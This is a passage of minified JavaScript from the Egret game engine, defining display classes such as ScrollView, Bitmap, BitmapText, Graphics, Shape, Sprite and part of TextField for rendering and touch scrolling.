            this._explicitWidth != a && (b.prototype._setWidth.call(this, a), this._updateContentPosition())
        };
        a.prototype._setHeight = function (a) {
            this._explicitHeight != a && (b.prototype._setHeight.call(this, a), this._updateContentPosition())
        };
        a.prototype._updateContentPosition = function () {
            var a =
                this.getBounds(c.Rectangle.identity);
            this.scrollRect = new c.Rectangle(this._scrollLeft, this._scrollTop, a.width, a.height);
            this.dispatchEvent(new c.Event(c.Event.CHANGE))
        };
        a.prototype._checkScrollPolicy = function () {
            var a = this.__checkScrollPolicy(this._horizontalScrollPolicy, this._getContentWidth(), this.width);
            this._hCanScroll = a;
            var b = this.__checkScrollPolicy(this._verticalScrollPolicy, this._getContentHeight(), this.height);
            this._vCanScroll = b;
            return a || b
        };
        a.prototype.__checkScrollPolicy = function (a, b, c) {
            return "on" ==
            a ? !0 : "off" == a ? !1 : b > c
        };
        a.prototype._addEvents = function () {
            this.addEventListener(c.TouchEvent.TOUCH_BEGIN, this._onTouchBegin, this);
            this.addEventListener(c.TouchEvent.TOUCH_BEGIN, this._onTouchBeginCapture, this, !0);
            this.addEventListener(c.TouchEvent.TOUCH_END, this._onTouchEndCapture, this, !0)
        };
        a.prototype._removeEvents = function () {
            this.removeEventListener(c.TouchEvent.TOUCH_BEGIN, this._onTouchBegin, this);
            this.removeEventListener(c.TouchEvent.TOUCH_BEGIN, this._onTouchBeginCapture, this, !0);
            this.removeEventListener(c.TouchEvent.TOUCH_END,
                this._onTouchEndCapture, this, !0)
        };
        a.prototype._onTouchBegin = function (a) {
            !a._isDefaultPrevented && this._checkScrollPolicy() && (this._touchStartPosition.x = a.stageX, this._touchStartPosition.y = a.stageY, (this._isHTweenPlaying || this._isVTweenPlaying) && this._onScrollFinished(), this.stage.addEventListener(c.TouchEvent.TOUCH_MOVE, this._onTouchMove, this), this.stage.addEventListener(c.TouchEvent.TOUCH_END, this._onTouchEnd, this), this.stage.addEventListener(c.TouchEvent.LEAVE_STAGE, this._onTouchEnd, this), this.addEventListener(c.Event.ENTER_FRAME,
                this._onEnterFrame, this), this._logTouchEvent(a), a.preventDefault())
        };
        a.prototype._onTouchBeginCapture = function (e) {
            var b = this._checkScrollPolicy();
            if (b) {
                for (var d = e.target; d != this;) {
                    if (d instanceof a && (b = d._checkScrollPolicy()))return;
                    d = d.parent
                }
                e.stopPropagation();
                this.delayTouchBeginEvent = this.cloneTouchEvent(e);
                this.touchBeginTimer || (this.touchBeginTimer = new c.Timer(100, 1), this.touchBeginTimer.addEventListener(c.TimerEvent.TIMER_COMPLETE, this._onTouchBeginTimer, this));
                this.touchBeginTimer.start();
                this._onTouchBegin(e)
            }
        };
        a.prototype._onTouchEndCapture = function (a) {
            this.delayTouchBeginEvent && this._onTouchBeginTimer()
        };
        a.prototype._onTouchBeginTimer = function () {
            this.touchBeginTimer.stop();
            var a = this.delayTouchBeginEvent;
            this.delayTouchBeginEvent = null;
            this.stage && this.dispatchPropagationEvent(a)
        };
        a.prototype.dispatchPropagationEvent = function (a) {
            for (var b = [], c = a._target; c;)b.push(c), c = c.parent;
            for (var d = this._content, f = 1; ; f += 2) {
                c = b[f];
                if (!c || c === d)break;
                b.unshift(c)
            }
            this._dispatchPropagationEvent(a,
                b)
        };
        a.prototype._dispatchPropagationEvent = function (a, b, c) {
            for (var d = b.length, f = 0; f < d; f++) {
                var g = b[f];
                a._currentTarget = g;
                a._target = this;
                a._eventPhase = f < c ? 1 : f == c ? 2 : 3;
                g._notifyListener(a);
                if (a._isPropagationStopped || a._isPropagationImmediateStopped)break
            }
        };
        a.prototype._onTouchMove = function (a) {
            if (this._lastTouchPosition.x != a.stageX || this._lastTouchPosition.y != a.stageY) {
                if (!this._scrollStarted) {
                    var b = a.stageX - this._touchStartPosition.x, c = a.stageY - this._touchStartPosition.y;
                    if (Math.sqrt(b * b + c * c) < this.scrollBeginThreshold) {
                        this._logTouchEvent(a);
                        return
                    }
                }
                this._scrollStarted = !0;
                this.delayTouchBeginEvent && (this.delayTouchBeginEvent = null, this.touchBeginTimer.stop());
                this.touchChildren = !1;
                b = this._getPointChange(a);
                this.setScrollPosition(b.y, b.x, !0);
                this._calcVelocitys(a);
                this._logTouchEvent(a)
            }
        };
        a.prototype._onTouchEnd = function (a) {
            this.touchChildren = !0;
            this._scrollStarted = !1;
            c.MainContext.instance.stage.removeEventListener(c.TouchEvent.TOUCH_MOVE, this._onTouchMove, this);
            c.MainContext.instance.stage.removeEventListener(c.TouchEvent.TOUCH_END, this._onTouchEnd,
                this);
            c.MainContext.instance.stage.removeEventListener(c.TouchEvent.LEAVE_STAGE, this._onTouchEnd, this);
            this.removeEventListener(c.Event.ENTER_FRAME, this._onEnterFrame, this);
            this._moveAfterTouchEnd()
        };
        a.prototype._onEnterFrame = function (a) {
            a = c.getTimer();
            100 < a - this._lastTouchTime && 300 > a - this._lastTouchTime && this._calcVelocitys(this._lastTouchEvent)
        };
        a.prototype._logTouchEvent = function (a) {
            this._lastTouchPosition.x = a.stageX;
            this._lastTouchPosition.y = a.stageY;
            this._lastTouchEvent = this.cloneTouchEvent(a);
            this._lastTouchTime = c.getTimer()
        };
        a.prototype._getPointChange = function (a) {
            return {
                x: !1 === this._hCanScroll ? 0 : this._lastTouchPosition.x - a.stageX,
                y: !1 === this._vCanScroll ? 0 : this._lastTouchPosition.y - a.stageY
            }
        };
        a.prototype._calcVelocitys = function (a) {
            var b = c.getTimer();
            if (0 == this._lastTouchTime)this._lastTouchTime = b; else {
                var d = this._getPointChange(a), b = b - this._lastTouchTime;
                d.x /= b;
                d.y /= b;
                this._velocitys.push(d);
                5 < this._velocitys.length && this._velocitys.shift();
                this._lastTouchPosition.x = a.stageX;
                this._lastTouchPosition.y =
                    a.stageY
            }
        };
        a.prototype._getContentWidth = function () {
            return this._content.explicitWidth || this._content.width
        };
        a.prototype._getContentHeight = function () {
            return this._content.explicitHeight || this._content.height
        };
        a.prototype.getMaxScrollLeft = function () {
            var a = this._getContentWidth() - this.width;
            return Math.max(0, a)
        };
        a.prototype.getMaxScrollTop = function () {
            var a = this._getContentHeight() - this.height;
            return Math.max(0, a)
        };
        a.prototype._moveAfterTouchEnd = function () {
            if (0 != this._velocitys.length) {
                for (var e = 0, b =
                    0, c = 0, d = 0; d < this._velocitys.length; d++)var f = this._velocitys[d], g = a.weight[d], e = e + f.x * g, b = b + f.y * g, c = c + g;
                this._velocitys.length = 0;
                0 >= this.scrollSpeed && (this.scrollSpeed = 1);
                e = e / c * this.scrollSpeed;
                b = b / c * this.scrollSpeed;
                f = Math.abs(e);
                c = Math.abs(b);
                g = this.getMaxScrollLeft();
                d = this.getMaxScrollTop();
                e = 0.02 < f ? this.getAnimationDatas(e, this._scrollLeft, g) : {
                    position: this._scrollLeft,
                    duration: 1
                };
                b = 0.02 < c ? this.getAnimationDatas(b, this._scrollTop, d) : {position: this._scrollTop, duration: 1};
                this.setScrollLeft(e.position,
                    e.duration);
                this.setScrollTop(b.position, b.duration)
            }
        };
        a.prototype._onTweenFinished = function (a) {
            a == this._vScrollTween && (this._isVTweenPlaying = !1);
            a == this._hScrollTween && (this._isHTweenPlaying = !1);
            !1 == this._isHTweenPlaying && !1 == this._isVTweenPlaying && this._onScrollFinished()
        };
        a.prototype._onScrollStarted = function () {
        };
        a.prototype._onScrollFinished = function () {
            c.Tween.removeTweens(this);
            this._vScrollTween = this._hScrollTween = null;
            this._isVTweenPlaying = this._isHTweenPlaying = !1;
            this.dispatchEvent(new c.Event(c.Event.COMPLETE))
        };
        a.prototype.setScrollTop = function (a, b) {
            void 0 === b && (b = 0);
            var d = Math.min(this.getMaxScrollTop(), Math.max(a, 0));
            if (0 == b)return this.scrollTop = d, null;
            var h = c.Tween.get(this).to({scrollTop: a}, b, c.Ease.quartOut);
            d != a && h.to({scrollTop: d}, 300, c.Ease.quintOut);
            this._isVTweenPlaying = !0;
            this._vScrollTween = h;
            h.call(this._onTweenFinished, this, [h]);
            this._isHTweenPlaying || this._onScrollStarted();
            return h
        };
        a.prototype.setScrollLeft = function (a, b) {
            void 0 === b && (b = 0);
            var d = Math.min(this.getMaxScrollLeft(), Math.max(a,
                0));
            if (0 == b)return this.scrollLeft = d, null;
            var h = c.Tween.get(this).to({scrollLeft: a}, b, c.Ease.quartOut);
            d != a && h.to({scrollLeft: d}, 300, c.Ease.quintOut);
            this._isHTweenPlaying = !0;
            this._hScrollTween = h;
            h.call(this._onTweenFinished, this, [h]);
            this._isVTweenPlaying || this._onScrollStarted();
            return h
        };
        a.prototype.getAnimationDatas = function (a, b, c) {
            var d = Math.abs(a), f = 0, g = b + 500 * a;
            if (0 > g || g > c)for (g = b; Infinity != Math.abs(a) && 0.02 < Math.abs(a);)g += a, a = 0 > g || g > c ? 0.998 * a * 0.95 : 0.998 * a, f++; else f = 500 * -Math.log(0.02 / d);
            return {position: Math.min(c + 50, Math.max(g, -50)), duration: f}
        };
        a.prototype.cloneTouchEvent = function (a) {
            var b = new c.TouchEvent(a._type, a._bubbles, a.cancelable);
            b.touchPointID = a.touchPointID;
            b._stageX = a._stageX;
            b._stageY = a._stageY;
            b.ctrlKey = a.ctrlKey;
            b.altKey = a.altKey;
            b.shiftKey = a.shiftKey;
            b.touchDown = a.touchDown;
            b._isDefaultPrevented = !1;
            b._target = a._target;
            return b
        };
        a.prototype.throwNotSupportedError = function () {
            throw Error(c.getString(1023));
        };
        a.prototype.addChild = function (a) {
            this.throwNotSupportedError();
            return null
        };
        a.prototype.addChildAt = function (a, b) {
            this.throwNotSupportedError();
            return null
        };
        a.prototype.removeChild = function (a) {
            this.throwNotSupportedError();
            return null
        };
        a.prototype.removeChildAt = function (a) {
            this.throwNotSupportedError();
            return null
        };
        a.prototype.setChildIndex = function (a, b) {
            this.throwNotSupportedError()
        };
        a.prototype.swapChildren = function (a, b) {
            this.throwNotSupportedError()
        };
        a.prototype.swapChildrenAt = function (a, b) {
            this.throwNotSupportedError()
        };
        a.prototype.hitTest = function (a, q, d) {
            void 0 ===
            d && (d = !1);
            var h = b.prototype.hitTest.call(this, a, q, d);
            return h ? h : c.DisplayObject.prototype.hitTest.call(this, a, q, d)
        };
        a.weight = [1, 1.33, 1.66, 2, 2.33];
        return a
    }(c.DisplayObjectContainer);
    c.ScrollView = d;
    d.prototype.__class__ = "egret.ScrollView"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.REPEAT = "repeat";
        b.SCALE = "scale";
        return b
    }();
    c.BitmapFillMode = d;
    d.prototype.__class__ = "egret.BitmapFillMode"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a) {
            b.call(this);
            this.debug = !1;
            this.debugColor = 16711680;
            this.scale9Grid = this._texture = null;
            this.fillMode = "scale";
            a && (this._texture = a, this._setSizeDirty());
            this.needDraw = !0
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "texture", {
            get: function () {
                return this._texture
            }, set: function (a) {
                a != this._texture && (this._setSizeDirty(), this._texture = a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._render = function (e) {
            var b = this._texture;
            b ? (this._texture_to_render = b, a._drawBitmap(e,
                this._hasWidthSet ? this._explicitWidth : b._textureWidth, this._hasHeightSet ? this._explicitHeight : b._textureHeight, this)) : this._texture_to_render = null
        };
        a._drawBitmap = function (e, b, c, d) {
            var f = d._texture_to_render;
            if (f) {
                var g = f._textureWidth, k = f._textureHeight;
                if ("scale" == d.fillMode) {
                    var l = d.scale9Grid || f.scale9Grid;
                    if (l && g - l.width < b && k - l.height < c)a.drawScale9GridImage(e, d, l, b, c); else {
                        var l = f._offsetX, m = f._offsetY, p = f._bitmapWidth || g, r = f._bitmapHeight || k;
                        b /= g;
                        l = Math.round(l * b);
                        b = Math.round(p * b);
                        c /= k;
                        m = Math.round(m *
                        c);
                        c = Math.round(r * c);
                        a.renderFilter.drawImage(e, d, f._bitmapX, f._bitmapY, p, r, l, m, b, c)
                    }
                } else a.drawRepeatImage(e, d, b, c, d.fillMode)
            }
        };
        a.drawRepeatImage = function (a, b, d, h, f) {
            var g = b._texture_to_render;
            if (g) {
                var k = g._textureWidth, l = g._textureHeight, m = g._bitmapX, p = g._bitmapY, k = g._bitmapWidth || k, l = g._bitmapHeight || l, r = g._offsetX, g = g._offsetY;
                c.RenderFilter.getInstance().drawImage(a, b, m, p, k, l, r, g, d, h, f)
            }
        };
        a.drawScale9GridImage = function (a, b, d, h, f) {
            var g = c.MainContext.instance.rendererContext._texture_scale_factor,
                k = b._texture_to_render;
            if (k && d) {
                var l = k._textureWidth, m = k._textureHeight, p = k._bitmapX, r = k._bitmapY, t = k._bitmapWidth || l, s = k._bitmapHeight || m;
                h -= l - t;
                f -= m - s;
                if (!a.drawImageScale9(k, p, r, t, s, k._offsetX, k._offsetY, h, f, d)) {
                    l = k._offsetX / g;
                    m = k._offsetY / g;
                    k = c.RenderFilter.getInstance();
                    d = c.Rectangle.identity.initialize(d.x - Math.round(l), d.y - Math.round(l), d.width, d.height);
                    l = Math.round(l);
                    m = Math.round(m);
                    d.y == d.bottom && (d.bottom < s ? d.bottom++ : d.y--);
                    d.x == d.right && (d.right < t ? d.right++ : d.x--);
                    var u = p + d.x / g, w = p +
                        d.right / g, v = t - d.right, y = r + d.y / g, g = r + d.bottom / g, x = s - d.bottom, z = l + d.x, A = m + d.y, s = f - (s - d.bottom), t = h - (t - d.right);
                    k.drawImage(a, b, p, r, d.x, d.y, l, m, d.x, d.y);
                    k.drawImage(a, b, u, r, d.width, d.y, z, m, t - d.x, d.y);
                    k.drawImage(a, b, w, r, v, d.y, l + t, m, h - t, d.y);
                    k.drawImage(a, b, p, y, d.x, d.height, l, A, d.x, s - d.y);
                    k.drawImage(a, b, u, y, d.width, d.height, z, A, t - d.x, s - d.y);
                    k.drawImage(a, b, w, y, v, d.height, l + t, A, h - t, s - d.y);
                    k.drawImage(a, b, p, g, d.x, x, l, m + s, d.x, f - s);
                    k.drawImage(a, b, u, g, d.width, x, z, m + s, t - d.x, f - s);
                    k.drawImage(a, b, w, g, v, x, l +
                    t, m + s, h - t, f - s)
                }
            }
        };
        a.prototype._measureBounds = function () {
            var a = this._texture;
            return a ? c.Rectangle.identity.initialize(a._offsetX, a._offsetY, a._textureWidth, a._textureHeight) : b.prototype._measureBounds.call(this)
        };
        a.debug = !1;
        a.renderFilter = c.RenderFilter.getInstance();
        return a
    }(c.DisplayObject);
    c.Bitmap = d;
    d.prototype.__class__ = "egret.Bitmap"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._text = "";
            this._textChanged = !1;
            this._font = null;
            this._fontChanged = !1;
            this._textOffsetY = this._textOffsetX = this._textHeight = this._textWidth = 0;
            this.textLinesChange = !0;
            this._lineHeights = [];
            this.cacheAsBitmap = !0
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "text", {
            get: function () {
                return this._text
            }, set: function (a) {
                this._text != a && (this._textChanged = !0, this._text = a, this._setSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype,
            "font", {
                get: function () {
                    return this._font
                }, set: function (a) {
                    this._font != a && (this._font = a, this._fontChanged = !0, this._setSizeDirty())
                }, enumerable: !0, configurable: !0
            });
        Object.defineProperty(a.prototype, "spriteSheet", {
            get: function () {
                return this._font
            }, set: function (a) {
                this.font = a
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setSizeDirty = function () {
            b.prototype._setSizeDirty.call(this);
            this.textLinesChange = !0
        };
        a.prototype._render = function (e) {
            var b = this.getTextLines(), d = b.length;
            if (0 != d) {
                for (var h = this._font,
                         f = h._getFirstCharHeight(), f = Math.ceil(f * a.EMPTY_FACTOR), g = 0, k = this._hasHeightSet ? this._explicitHeight : Number.POSITIVE_INFINITY, l = this._lineHeights, m = 0; m < d; m++) {
                    var p = l[m];
                    if (0 < m && g + p > k)break;
                    for (var r = b[m], t = r.length, s = 0, u = 0; u < t; u++) {
                        var w = r.charAt(u), v = h.getTexture(w);
                        if (v) {
                            var w = v._bitmapWidth || v._textureWidth, y = v._bitmapHeight || v._textureHeight;
                            this._texture_to_render = v;
                            c.RenderFilter.getInstance().drawImage(e, this, v._bitmapX, v._bitmapY, w, y, s + v._offsetX, g + v._offsetY, w, y);
                            s += v._textureWidth
                        } else" " ==
                        w ? s += f : c.Logger.warningWithErrorId(1011, w)
                    }
                    g += p
                }
                this._texture_to_render = null
            }
        };
        a.prototype._measureBounds = function () {
            return 0 == this.getTextLines().length ? c.Rectangle.identity.initialize(0, 0, 0, 0) : c.Rectangle.identity.initialize(this._textOffsetX, this._textOffsetY, this._textWidth - this._textOffsetX, this._textHeight - this._textOffsetY)
        };
        a.prototype.getTextLines = function () {
            if (!this.textLinesChange)return this._textLines;
            var e = [];
            this._textLines = e;
            this.textLinesChange = !1;
            var b = [];
            this._lineHeights = b;
            if (!this._text || !this._font)return e;
            for (var d = 0, h = 0, f = 0, g = 0, k = this._hasWidthSet, l = this._hasWidthSet ? this._explicitWidth : Number.POSITIVE_INFINITY, m = this._font, p = m._getFirstCharHeight(), r = Math.ceil(p * a.EMPTY_FACTOR), t = this._text.split(/(?:\r\n|\r|\n)/), s = t.length, u = !0, w = 0; w < s; w++) {
                for (var v = t[w], y = v.length, x = 0, z = 0, A = !0, C = 0; C < y; C++) {
                    var B = v.charAt(C), E, F = 0, G = 0, D = m.getTexture(B);
                    if (D)B = D._textureWidth, E = D._textureHeight, F = D._offsetX, G = D._offsetY; else if (" " == B)B = r, E = p; else {
                        c.Logger.warningWithErrorId(1011, B);
                        A && (A = !1);
                        continue
                    }
                    A && (A = !1, f = Math.min(F, f));
                    u && (g = Math.min(G, g));
                    k && 0 < C && z + B > l ? (e.push(v.substring(0, C)), b.push(x), h += x, d = Math.max(z, d), v = v.substring(C), y = v.length, C = 0, z = B, x = E) : (z += B, x = Math.max(E, x))
                }
                u && (u = !1);
                e.push(v);
                b.push(x);
                h += x;
                d = Math.max(z, d)
            }
            this._textWidth = d;
            this._textHeight = h;
            this._textOffsetX = f;
            this._textOffsetY = g;
            return e
        };
        a.EMPTY_FACTOR = 0.33;
        return a
    }(c.DisplayObject);
    c.BitmapText = d;
    d.prototype.__class__ = "egret.BitmapText"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
            this.fillStyleColor = this.strokeStyleColor = this.renderContext = this.commandQueue = this.canvasContext = null;
            this._dirty = !1;
            this._lastY = this._lastX = this._maxY = this._maxX = this._minY = this._minX = 0;
            this.commandQueue = []
        }

        b.prototype.beginFill = function (a, e) {
        };
        b.prototype._setStyle = function (a) {
        };
        b.prototype.drawRect = function (a, e, b, c) {
            this.checkRect(a, e, b, c)
        };
        b.prototype.drawCircle = function (a, e, b) {
            this.checkRect(a - b, e - b, 2 * b, 2 * b)
        };
        b.prototype.drawRoundRect = function (a, e,
                                              b, c, d, f) {
            this.checkRect(a, e, b, c)
        };
        b.prototype.drawEllipse = function (a, e, b, c) {
            this.checkRect(a - b, e - c, 2 * b, 2 * c)
        };
        b.prototype.lineStyle = function (a, e, b, c, d, f, g, k) {
        };
        b.prototype.lineTo = function (a, e) {
            this.checkPoint(a, e)
        };
        b.prototype.curveTo = function (a, e, b, c) {
            this.checkPoint(a, e);
            this.checkPoint(b, c)
        };
        b.prototype.moveTo = function (a, e) {
            this.checkPoint(a, e)
        };
        b.prototype.clear = function () {
            this._maxY = this._maxX = this._minY = this._minX = 0
        };
        b.prototype.endFill = function () {
        };
        b.prototype._draw = function (a) {
        };
        b.prototype.checkRect =
            function (a, e, b, c) {
                this._minX = Math.min(this._minX, a);
                this._minY = Math.min(this._minY, e);
                this._maxX = Math.max(this._maxX, a + b);
                this._maxY = Math.max(this._maxY, e + c)
            };
        b.prototype.checkPoint = function (a, e) {
            this._minX = Math.min(this._minX, a);
            this._minY = Math.min(this._minY, e);
            this._maxX = Math.max(this._maxX, a);
            this._maxY = Math.max(this._maxY, e);
            this._lastX = a;
            this._lastY = e
        };
        b.prototype._measureBounds = function () {
            return c.Rectangle.identity.initialize(this._minX, this._minY, this._maxX - this._minX, this._maxY - this._minY)
        };
        return b
    }();
    c.Graphics = d;
    d.prototype.__class__ = "egret.Graphics";
    (function () {
        return function (b, a, e) {
            this.method = b;
            this.thisObject = a;
            this.args = e
        }
    })().prototype.__class__ = "egret.Command"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._graphics = null
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "graphics", {
            get: function () {
                this._graphics || (this._graphics = new c.Graphics, this.needDraw = !0);
                return this._graphics
            }, enumerable: !0, configurable: !0
        });
        a.prototype._render = function (a) {
            this._graphics && this._graphics._draw(a)
        };
        a.prototype._measureBounds = function () {
            var a = this._graphics;
            return a ? a._measureBounds() : b.prototype._measureBounds.call(this)
        };
        return a
    }(c.DisplayObject);
    c.Shape =
        d;
    d.prototype.__class__ = "egret.Shape"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._graphics = null
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "graphics", {
            get: function () {
                this._graphics || (this._graphics = new c.Graphics, this.needDraw = !0);
                return this._graphics
            }, enumerable: !0, configurable: !0
        });
        a.prototype._render = function (a) {
            this._graphics && this._graphics._draw(a);
            b.prototype._render.call(this, a)
        };
        a.prototype._measureBounds = function () {
            for (var a = 0, b = 0, d = 0, h = 0, f = this._children.length, g = 0; g < f; g++) {
                var k = this._children[g];
                if (k._visible) {
                    var l = k.getBounds(c.Rectangle.identity, !1), m = l.x, p = l.y, r = l.width, l = l.height, k = k._getMatrix(), k = c.DisplayObject.getTransformBounds(c.Rectangle.identity.initialize(m, p, r, l), k), m = k.x, p = k.y, r = k.width + k.x, k = k.height + k.y;
                    if (m < a || 0 == g)a = m;
                    if (r > b || 0 == g)b = r;
                    if (p < d || 0 == g)d = p;
                    if (k > h || 0 == g)h = k
                }
            }
            if (this._graphics) {
                f = this._graphics._measureBounds();
                m = f.x;
                p = f.y;
                r = f.width + f.x;
                k = f.height + f.y;
                if (m < a || 0 == g)a = m;
                if (r > b || 0 == g)b = r;
                if (p < d || 0 == g)d = p;
                if (k > h || 0 == g)h = k
            }
            return c.Rectangle.identity.initialize(a,
                d, b - a, h - d)
        };
        return a
    }(c.DisplayObjectContainer);
    c.Sprite = d;
    d.prototype.__class__ = "egret.Sprite"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._inputEnabled = !1;
            this._type = "";
            this._inputUtils = null;
            this._text = "";
            this._displayAsPassword = !1;
            this._fontFamily = a.default_fontFamily;
            this._size = 30;
            this._bold = this._italic = !1;
            this._textColorString = "#FFFFFF";
            this._textColor = 16777215;
            this._strokeColorString = "#000000";
            this._stroke = this._strokeColor = 0;
            this._textAlign = "left";
            this._verticalAlign = "top";
            this._maxChars = 0;
            this._scrollV = -1;
            this._numLines = this._lineSpacing = this._maxScrollV = 0;
            this._isFlow =
                this._multiline = !1;
            this._textArr = [];
            this._isArrayChanged = !1;
            this._textMaxHeight = this._textMaxWidth = 0;
            this._linesArr = [];
            this.needDraw = !0
        }

        __extends(a, b);
        a.prototype.isInput = function () {
            return this._type == c.TextFieldType.INPUT
        };
        a.prototype._setTouchEnabled = function (a) {
            b.prototype._setTouchEnabled.call(this, a);
            this.isInput() && (this._inputEnabled = !0)
        };
        Object.defineProperty(a.prototype, "type", {
            get: function () {
                return this._type
            }, set: function (a) {
                this._setType(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setType =
            function (a) {
                this._type != a && (this._type = a, this._type == c.TextFieldType.INPUT ? (this._hasWidthSet || this._setWidth(100), this._hasHeightSet || this._setHeight(30), null == this._inputUtils && (this._inputUtils = new c.InputController), this._inputUtils.init(this), this._setDirty(), this._stage && this._inputUtils._addStageText()) : this._inputUtils && (this._inputUtils._removeStageText(), this._inputUtils = null))
            };
        Object.defineProperty(a.prototype, "text", {
            get: function () {
                return this._getText()
            }, set: function (a) {
                this._setText(a)
            },
            enumerable: !0, configurable: !0
        });
        a.prototype._getText = function () {
            return this._type == c.TextFieldType.INPUT ? this._inputUtils._getText() : this._text
        };
        a.prototype._setSizeDirty = function () {
            b.prototype._setSizeDirty.call(this);
            this._isArrayChanged = !0
        };
        a.prototype._setTextDirty = function () {
            this._setSizeDirty()
        };
        a.prototype._setBaseText = function (a) {
            null == a && (a = "");
            this._isFlow = !1;
            this._text != a && (this._setTextDirty(), this._text = a, a = "", a = this._displayAsPassword ? this.changeToPassText(this._text) : this._text, this.setMiddleStyle([{text: a}]))
        };
        a.prototype._setText = function (a) {
            null == a && (a = "");
            this._setBaseText(a);
            this._inputUtils && this._inputUtils._setText(this._text)
        };
        Object.defineProperty(a.prototype, "displayAsPassword", {
            get: function () {
                return this._displayAsPassword
            }, set: function (a) {
                this._setDisplayAsPassword(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setDisplayAsPassword = function (a) {
            this._displayAsPassword != a && (this._displayAsPassword = a, this._setTextDirty(), a = "", a = this._displayAsPassword ? this.changeToPassText(this._text) : this._text,
                this.setMiddleStyle([{text: a}]))
        };
        Object.defineProperty(a.prototype, "fontFamily", {
            get: function () {
                return this._fontFamily
            }, set: function (a) {
                this._setFontFamily(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setFontFamily = function (a) {
            this._fontFamily != a && (this._setTextDirty(), this._fontFamily = a)
        };
        Object.defineProperty(a.prototype, "size", {
            get: function () {
                return this._size
            }, set: function (a) {
                this._setSize(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setSize = function (a) {
            this._size != a && (this._setTextDirty(),
                this._size = a)
        };
        Object.defineProperty(a.prototype, "italic", {
            get: function () {
                return this._italic
            }, set: function (a) {
                this._setItalic(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setItalic = function (a) {
            this._italic != a && (this._setTextDirty(), this._italic = a)
        };
        Object.defineProperty(a.prototype, "bold", {
            get: function () {
                return this._bold
            }, set: function (a) {
                this._setBold(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setBold = function (a) {
            this._bold != a && (this._setTextDirty(), this._bold = a)
        };
        Object.defineProperty(a.prototype,
            "textColor", {
                get: function () {
                    return this._textColor
                }, set: function (a) {
                    this._setTextColor(a)
                }, enumerable: !0, configurable: !0
            });
        a.prototype._setTextColor = function (a) {
            this._textColor != a && (this._setTextDirty(), this._textColor = a, this._textColorString = c.toColorString(a))
        };
        Object.defineProperty(a.prototype, "strokeColor", {
            get: function () {
                return this._strokeColor
            }, set: function (a) {
                this._setStrokeColor(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setStrokeColor = function (a) {
            this._strokeColor != a && (this._setTextDirty(),
                this._strokeColor = a, this._strokeColorString = c.toColorString(a))
        };
        Object.defineProperty(a.prototype, "stroke", {
            get: function () {
                return this._stroke
            }, set: function (a) {
                this._setStroke(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setStroke = function (a) {
            this._stroke != a && (this._setTextDirty(), this._stroke = a)
        };
        Object.defineProperty(a.prototype, "textAlign", {
            get: function () {
                return this._textAlign
            }, set: function (a) {
                this._setTextAlign(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setTextAlign = function (a) {
            this._textAlign !=
            a && (this._setTextDirty(), this._textAlign = a)
        };
        Object.defineProperty(a.prototype, "verticalAlign", {
            get: function () {
                return this._verticalAlign
            }, set: function (a) {
                this._setVerticalAlign(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setVerticalAlign = function (a) {
            this._verticalAlign != a && (this._setTextDirty(), this._verticalAlign = a)
        };
        Object.defineProperty(a.prototype, "maxChars", {
            get: function () {
                return this._maxChars
            }, set: function (a) {
                this._setMaxChars(a)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setMaxChars =
            function (a) {
                this._maxChars != a && (this._maxChars = a)
            };
        Object.defineProperty(a.prototype, "scrollV", {
            set: function (a) {
                this._scrollV = a;
                this._setDirty()
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "maxScrollV", {
            get: function () {
                return this._maxScrollV
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "selectionBeginIndex", {
            get: function () {
                return 0
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "selectionEndIndex", {
            get: function () {
                return 0
            }, enumerable: !0,
            configurable: !0
        });
        Object.defineProperty(a.prototype, "caretIndex", {
            get: function () {
                return 0
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setSelection = function (a, b) {
        };
        Object.defineProperty(a.prototype, "lineSpacing", {
            get: function () {
                return this._lineSpacing
            }, set: function (a) {
                this._setLineSpacing(a)
            }, enumerable: !0, configurable: !0
        });
